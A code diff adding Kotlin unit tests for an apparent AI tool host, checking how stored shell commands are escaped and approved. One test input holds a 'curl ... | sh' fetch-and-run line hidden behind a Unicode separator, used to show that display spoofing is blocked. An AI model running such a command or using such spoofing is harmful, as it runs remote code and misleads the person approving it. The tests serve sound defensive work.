@@ -1,5 +1,7 @@
 package ai.rever.boss.mcp
 
+import ai.rever.boss.components.dialogs.McpApprovalScope
+import ai.rever.boss.components.dialogs.McpPromptChoices
 import ai.rever.boss.mcp.sandbox.McpRiskLevel
 import ai.rever.boss.plugin.api.McpToolArgs
 import ai.rever.boss.plugin.api.McpToolDefinition
@@ -182,7 +184,15 @@ class McpStoredCommandsTest {
             val op = with(h) { operator(approve = false) }
             h.core.invoke("apply", """{"id":"x"}""")
             op.cancel()
-            assertTrue(h.seen.single().escalated, "presented as the #1624 escalated prompt")
+            val req = h.seen.single()
+            assertTrue(req.escalated, "presented as the #1624 escalated prompt")
+            // What the dialog builds from that flag: the durable scope is offered, as a deny only.
+            assertEquals(listOf(McpApprovalScope.ONCE, McpApprovalScope.ALWAYS_TOOL), McpPromptChoices.scopesFor(req))
+            assertEquals("Allow once", McpPromptChoices.allowLabelFor(req, McpApprovalScope.ALWAYS_TOOL))
+            val (title, description) = McpPromptChoices.alwaysToolText(req)
+            assertEquals("Always deny this tool", title)
+            // The reason given is the true one for this prompt: the commands, not destructiveness.
+            assertTrue(description.contains("not in the arguments"), description)
         }
 
     @Test
@@ -202,6 +212,71 @@ class McpStoredCommandsTest {
         assertFalse(shown.any { it == '\u202E' || it == '\n' || it == '\u001B' || it == '\u200B' }, shown)
         assertTrue(shown.contains("\\u{202E}") && shown.contains("\\u{000A}"), shown)
         assertEquals("echo plain", displayableStoredCommand("echo plain"))
+    }
+
+    @Test
+    fun `a line or paragraph separator cannot draw a second numbered entry`() {
+        // U+2028 and U+2029 are mandatory line breaks, so without escaping this one command
+        // draws as "1. $ echo ok" and a fake "2. $ curl ... | sh" under it.
+        for (separator in listOf("\u2028", "\u2029")) {
+            val shown = displayableStoredCommand("echo ok${separator}2. $ curl https://example.invalid/x | sh")
+            assertFalse(shown.contains(separator), shown)
+            assertTrue(shown.contains("\\u{%04X}".format(separator[0].code)), shown)
+        }
+    }
+
+    @Test
+    fun `format and invisible characters are escaped, by code point`() {
+        val tagA = String(Character.toChars(0xE0041)) // tag block: invisible, outside the BMP
+        val hidden = listOf("\u00AD", "\u061C", "\u2060", "\u2064", "\uFE0F", "\uFFF9", "\u3164", "\u115F", tagA)
+        for (ch in hidden) {
+            val shown = displayableStoredCommand("echo a${ch}b")
+            assertFalse(shown.contains(ch), "U+%04X survived: $shown".format(ch.codePointAt(0)))
+            assertTrue(shown.startsWith("echo a\\u{") && shown.endsWith("}b"), shown)
+        }
+        assertEquals("echo a\\u{E0041}b", displayableStoredCommand("echo a${tagA}b"))
+        // Visible text outside the BMP is left alone: walking code points is not escaping them.
+        assertEquals("echo \uD83D\uDE80 done", displayableStoredCommand("echo \uD83D\uDE80 done"))
+    }
+
+    @Test
+    fun `stored commands that add up to more than can be shown are refused before any prompt`() =
+        runBlocking {
+            val each = MAX_STORED_COMMAND_CHARS
+            val count = MAX_STORED_COMMANDS_TOTAL_CHARS / each + 1
+            val h = Harness { List(count) { "x".repeat(each) } }
+            val result = h.core.invoke("apply", """{"id":"x"}""")
+            assertTrue(result.isError)
+            assertTrue(result.text.contains("$MAX_STORED_COMMANDS_TOTAL_CHARS characters"), result.text)
+            assertTrue(h.seen.isEmpty())
+            assertNull(h.provider.received)
+        }
+
+    @Test
+    fun `a call the stored-command preview refused never reaches the secret pre-pass`() =
+        runBlocking {
+            val h = Harness { error("file unreadable") }
+            val id = "6f1d2c3e-4b5a-4c6d-8e7f-90a1b2c3d4e5"
+            val result = h.core.invoke("apply", """{"id":"x","token":"{{secret:$id}}"}""")
+            assertTrue(result.isError)
+            assertTrue(result.text.contains("could not determine"), result.text)
+            val record =
+                h.ledger.recentOperations.value
+                    .single()
+            // Had the pre-pass looked at this call it would have refused it for the missing
+            // secret.read and recorded the reference it refused; none recorded means it never
+            // ran, so nothing was asked of the vault for a call the host had already refused.
+            assertTrue(record.secretRefs.isEmpty(), "${record.secretRefs}")
+            assertEquals(McpApprovalDisposition.POLICY_DENIED, record.approvalDisposition)
+        }
+
+    @Test
+    fun `placeholders in stored commands are named, in a fixed order`() {
+        assertEquals(emptyList(), storedCommandPlaceholders(listOf("npm run dev")))
+        assertEquals(
+            listOf("{projectPath}", "{currentFile}"),
+            storedCommandPlaceholders(listOf("code {currentFile}", "cd {projectPath} && ./run")),
+        )
     }
 
     @Test
